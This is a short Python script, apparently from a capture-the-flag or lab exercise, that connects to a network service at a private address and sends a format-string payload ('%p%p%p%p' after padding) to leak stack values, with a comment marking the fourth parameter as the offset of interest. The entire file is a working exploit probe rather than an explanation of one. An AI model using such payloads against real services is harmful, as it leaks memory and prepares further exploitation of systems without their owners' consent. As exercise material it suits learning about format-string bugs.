import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.214.160.13', 11005))

message = s.recv(1024).decode()

print(message)

data = "aaaaaaaaaaaaaaaaaaaa%p%p%p%p\n" # fourth param

s.send(data.encode('utf-8'))

time.sleep(0.5)

message = s.recv(1024).decode()

print(message)